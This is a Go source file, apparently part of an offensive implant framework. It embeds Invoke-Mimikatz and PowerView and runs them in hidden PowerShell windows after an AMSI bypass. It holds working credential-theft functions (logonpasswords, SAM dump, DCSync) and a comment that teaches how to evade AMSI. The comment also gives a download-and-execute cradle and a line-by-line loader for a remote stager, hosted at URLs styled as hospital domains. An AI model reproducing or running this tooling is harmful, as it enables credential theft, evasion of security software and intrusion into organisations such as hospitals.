package pwmodules

import (
	"bytes"
//	"bufio"
	_ "embed"
	"fmt"
	"os/exec"
	"strings"
	"syscall"
)

//go:embed powershell_tools/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1
var mimirawScript []byte

//go:embed powershell_tools/PowerSploit/Recon/PowerView.ps1
var pwvrawScript []byte




func runMimiCommand(mimikatzCmd string) string {
	

	fullScript := fmt.Sprintf(`
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);
%s
Invoke-Mimikatz -Command '%s'
`, string(mimirawScript), mimikatzCmd)

	cmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", "-")

	// Hide PowerShell window
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	// Provide script via stdin (bypasses length limit and avoids disk)
	cmd.Stdin = bytes.NewReader([]byte(fullScript))

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	err := cmd.Run()

	if err != nil {
		return fmt.Sprintf("[!] PowerShell error: %v\nStderr: %s\nStdout: %s",
			err, strings.TrimSpace(stderr.String()), strings.TrimSpace(stdout.String()))
	}

	output := strings.TrimSpace(stdout.String())
	if output == "" {
		return "[!] No output from Mimikatz"
	}
	return output
}

func MimiCommand(mcommand string) string {

	return runMimiCommand(mcommand) 

}

func LogonPasswords() string {
	return runMimiCommand(`"privilege::debug" "sekurlsa::logonpasswords"`)
}

func MimiDumpSAM() string {
	return runMimiCommand(`"lsadump::sam"`)
}


func MimiDcSync(domain, user string) string {
    cmd := fmt.Sprintf(`"lsadump::dcsync /domain:%s /user:%s"`, domain, user)
    return runMimiCommand(cmd)
}


/*

	The technique used to bypass AMSI here is simple but effective.

	As many of you know, using Matt Graeber’s well-known AMSI bypass method via reflection
	(e.g., `[Ref].Assembly.GetType(...).GetField(...).SetValue(...)`) is usually detected and blocked
	by modern AMSI signatures if it is executed as a single line.

	However, years ago I came across a clever trick (I don’t recall the original source),
	and I’ve been using it successfully ever since.

	The idea is this: instead of running the AMSI bypass in one line, split it into multiple lines
	and run them one at a time *in the same PowerShell process*. This delays AMSI scanning until after
	the bypass has taken effect.

	== PoC ==

	PS C:\Users\p4p4> "Invoke-Empire"
	At line:1 char:1
	+ "Invoke-Empire"
	+ ~~~~~~~~~~~~~~~
	This script contains malicious content and has been blocked by your antivirus software.
	+ CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
	+ FullyQualifiedErrorId : ScriptContainedMaliciousContent


	PS C:\Users\p4p4> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
	At line:1 char:1
	+ [Ref].Assembly.GetType(...)
	+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	This script contains malicious content and has been blocked by your antivirus software.

	PS C:\Users\p4p4> $Ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
	PS C:\Users\p4p4> $Field = $Ref.GetField('amsiInitFailed', 'NonPublic,Static')
	PS C:\Users\p4p4> $Field.SetValue($null, $true)
	PS C:\Users\p4p4> "Invoke-Empire"
	Invoke-Empire

	As you can see, breaking it into multiple lines makes AMSI bypass effective.

	== Real-World Example ==

	Let’s say your PowerShell stager is hosted at:
		https://us.hospital.org/patients

	You could prepend the AMSI bypass lines to the beginning of your remote script like this:

		$a = [Ref].Assembly.GetType('Sys'+'tem.Manag'+'ement.Au'+'tomation.Am'+'siUtils')
		$b = $a.GetField('ams'+'iInitF'+'ailed','NonP'+'ublic,St'+'atic')
		$b.SetValue($null,$true)
		iex (New-Object Net.WebClient).DownloadString('http://example.com/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command "privilege::debug"


	Then, you can host a loader script at:
		https://mayo-clinic.org/patient-centered-care

	This loader fetches and executes the above payload **line by line**:

		$file = (New-Object System.Net.WebClient).DownloadString('https://us.hospital.org/patients')
		foreach ($line in $file) {
			$line | powershell -nop -w hidden
		}

	This technique works reliably to disable AMSI before malicious commands are scanned.

	 Please make sure to remove this comment before generating ndobinPayloads. 
*/


func PwshImport(pscript, piCmd []byte) string {
	// All imported script can will bypass amsi 
	var fullScript bytes.Buffer
	
	// AMSI bypass commands (executed first)
	fullScript.WriteString(
		"$null = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');\n" +
		"$field = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static');\n" +
		"$field.SetValue($null,$true);\n\n")
	
	fullScript.Write(pscript)
	fullScript.WriteByte('\n')
	fullScript.Write(piCmd)
	fullScript.WriteString("\nExit")

	cmd := exec.Command("powershell.exe",
		"-NoProfile",
		"-NonInteractive",
		"-ExecutionPolicy", "Bypass",
		"-Command", "-",
	)

	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Stdin = &fullScript

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	err := cmd.Run()

	output := strings.TrimSpace(stdout.String())
	errorOutput := strings.TrimSpace(stderr.String())

	if err != nil {
		return fmt.Sprintf("[!] Execution failed\nError: %v\nStderr: %s\nStdout: %s",
			err, errorOutput, output)
	}

	if output == "" {
		return "[!] Command executed but no output"
	}
	
	return output
}

///////////////////////// powerview /////////////////////////
func runPowerViewCommand(pwvCmd string) string {
	// you can still obfuscate amsi bypass its for pwsploit recon module.
	fullScript := fmt.Sprintf(`
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);
%s
%s
`, string(pwvrawScript), pwvCmd)

	cmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", "-")

	// Hide PowerShell window
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	// Provide script via stdin
	cmd.Stdin = bytes.NewReader([]byte(fullScript))

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	err := cmd.Run()

	if err != nil {
		return fmt.Sprintf("[!] PowerShell error: %v\nStderr: %s\nStdout: %s",
			err, strings.TrimSpace(stderr.String()), strings.TrimSpace(stdout.String()))
	}

	output := strings.TrimSpace(stdout.String())
	if output == "" {
		return "[!] No output from PowerView"
	}
	return output
}


func PwvC(pwv string) string {
	return runPowerViewCommand(pwv)
}

